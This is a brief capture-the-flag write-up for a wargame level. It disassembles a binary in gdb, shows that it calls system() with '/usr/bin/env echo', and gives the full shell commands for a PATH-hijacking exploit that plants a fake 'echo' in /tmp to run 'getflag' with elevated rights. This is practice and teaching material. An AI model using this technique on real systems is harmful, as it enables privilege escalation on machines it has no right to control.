## level03

There is an executable in the home folder. `./level03` -> `Exploit me`. We will try to reverse engineer it.

```
$ gdb ./level03
(gdb) break main
(gdb) disassemble
...
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave  
   0x08048504 <+96>:    ret
(gdb) x/s 0x80485e0
0x80485e0:       "/usr/bin/env echo Exploit me"
```

We can execute arbitrary code by making sure `env echo` returns our executable.

```shell
echo '#!/bin/sh' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo
PATH="/tmp:$PATH" ./level03
```